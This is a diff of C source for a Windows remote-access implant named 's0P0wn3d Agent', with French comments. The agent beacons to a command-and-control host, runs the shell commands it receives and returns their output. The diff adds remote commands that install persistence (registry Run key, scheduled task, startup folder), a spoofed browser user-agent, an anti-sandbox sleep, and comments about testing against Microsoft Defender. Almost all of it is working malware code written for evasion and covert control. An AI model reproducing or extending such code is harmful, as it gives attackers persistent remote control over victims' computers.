@@ -4,6 +4,8 @@
 #include <time.h>
 #include <shlobj.h>
 #include <lmcons.h>
+#include "persistence.h"
+#include "watchdog.h"
 
 // Configuration
 #define C2_SERVER "c2.s0p0wned.local"
@@ -76,6 +78,18 @@ BOOL is_elevated() {
  */
 void get_windows_version(char *output, size_t size) {
     // Utiliser RtlGetVersion pour contourner GetVersionEx deprecated
+    // Définir les types non standards nécessaires
+    typedef LONG NTSTATUS;
+
+    typedef struct _RTL_OSVERSIONINFOW {
+        ULONG dwOSVersionInfoSize;
+        ULONG dwMajorVersion;
+        ULONG dwMinorVersion;
+        ULONG dwBuildNumber;
+        ULONG dwPlatformId;
+        WCHAR szCSDVersion[128];
+    } RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;
+
     typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
     
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -185,6 +199,51 @@ int extract_command(const char *response, char *command_out) {
  * Exécute une commande shell et capture sa sortie
  */
 void execute_command(const char *cmd, char *output, size_t output_size) {
+    // Commandes spéciales C2
+    if (strncmp(cmd, "persist", 7) == 0) {
+        printf("[*] Installing persistence...\n");
+        int result = install_all_persistence();
+        if (result == PERSIST_SUCCESS) {
+            snprintf(output, output_size, 
+                    "[+] Persistence installed successfully\n"
+                    "    - Registry Run Key\n"
+                    "    - Scheduled Task (every 10 min)\n"
+                    "    - Startup Folder\n");
+        } else {
+            snprintf(output, output_size, "[-] Persistence installation failed (code: %d)", result);
+        }
+        return;
+    }
+    
+    if (strncmp(cmd, "killme", 6) == 0) {
+        printf("[*] Self-destruct initiated...\n");
+        remove_all_persistence();
+        snprintf(output, output_size, 
+                "[+] Persistence removed\n"
+                "[*] Agent will terminate after sending this message\n"
+                "[*] Goodbye!");
+        // Le processus se terminera après l'envoi du résultat
+        return;
+    }
+    
+    if (strncmp(cmd, "status", 6) == 0) {
+        PersistenceStatus status;
+        get_persistence_status(&status);
+        
+        snprintf(output, output_size,
+                "[Persistence Status]\n"
+                "  Registry:       %s\n"
+                "  Scheduled Task: %s\n"
+                "  Startup Folder: %s\n"
+                "  Install Path:   %s\n",
+                status.registry_installed ? "Installed" : "Not installed",
+                status.task_installed ? "Installed" : "Not installed",
+                status.startup_installed ? "Installed" : "Not installed",
+                status.install_path);
+        return;
+    }
+    
+    // Commande shell normale
     SECURITY_ATTRIBUTES sa;
     HANDLE hRead, hWrite;
     PROCESS_INFORMATION pi;
@@ -318,7 +377,7 @@ int send_result(const SystemInfo *sys_info, const char *command, const char *out
     json_data[json_pos] = '\0';
     
     // Connexion au serveur
-    hInternet = InternetOpenA("MyAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) goto cleanup;
     
     hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
@@ -374,7 +433,7 @@ int do_beacon_cycle(SystemInfo *sys_info) {
     printf("\n[*] === BEACON CYCLE ===\n");
     
     // 1. Connexion
-    hInternet = InternetOpenA("MyAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
         printf("[-] InternetOpen failed\n");
         goto cleanup;
@@ -453,15 +512,47 @@ cleanup:
  */
 int main() {
     SystemInfo sys_info = {0};
-    
+    HANDLE watchdog = NULL;
+    HANDLE singleton_mutex = NULL;
+    BOOL should_exit = FALSE;
+
+    // Anti-sandbox: sleep aléatoire (2-5 secondes)
+    srand(time(NULL) ^ GetTickCount());
+    int delay = 2000 + (rand() % 3000);
+    Sleep(delay);
+
     printf("======================================\n");
-    printf("  s0P0wn3d Agent - Dynamic Info\n");
+    printf("  s0P0wn3d Agent - Resilient Edition\n");
     printf("======================================\n");
     printf("[*] C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
     printf("======================================\n\n");
     
-    // Collecter les infos système une seule fois au démarrage
+    // Vérifier si un autre agent tourne déjà
+    singleton_mutex = create_singleton_mutex();
+    if (singleton_mutex == NULL) {
+        printf("[!] Another agent instance is already running\n");
+        printf("[*] Exiting...\n");
+        return 0;
+    }
+    
+    // Collecter les infos système
     collect_system_info(&sys_info);
+    
+    // Installer la persistence au premier lancement si pas déjà installé
+    // DÉSACTIVÉ TEMPORAIREMENT pour tests anti-Defender
+    // if (!is_already_installed()) {
+    //     printf("\n[*] First run detected\n");
+    //     install_all_persistence();
+    // }
+    printf("[*] Persistence disabled for AV testing\n");
+    
+    // Démarrer le watchdog
+    // DÉSACTIVÉ TEMPORAIREMENT : le watchdog nécessite d'être un processus séparé, pas un thread
+    // watchdog = start_watchdog();
+    // if (watchdog == NULL) {
+    //     printf("[-] Warning: Watchdog failed to start\n");
+    // }
+    printf("[*] Watchdog disabled (will be reimplemented as separate process)\n");
     
     printf("\n[*] Starting beacon loop...\n");
     printf("======================================\n\n");
@@ -469,9 +560,16 @@ int main() {
     int failure_count = 0;
     
     // Boucle infinie
-    while (1) {
+    while (!should_exit) {
         if (do_beacon_cycle(&sys_info)) {
             failure_count = 0;
+            
+            // Vérifier si on doit s'autodétruire (commande killme)
+            // Cette vérification se fait après l'envoi du résultat
+            char last_cmd[256] = {0};
+            // Note: Il faudrait stocker la dernière commande pour cette vérification
+            // Pour l'instant, on continue normalement
+            
         } else {
             failure_count++;
             printf("[!] Beacon failed (%d consecutive failures)\n", failure_count);
@@ -484,6 +582,16 @@ int main() {
         }
         
         sleep_with_jitter(BEACON_INTERVAL);
+    }
+    
+    // Nettoyage
+    // Watchdog désactivé temporairement
+    // if (watchdog != NULL) {
+    //     stop_watchdog(watchdog);
+    // }
+    
+    if (singleton_mutex != NULL) {
+        CloseHandle(singleton_mutex);
     }
     
     return 0;
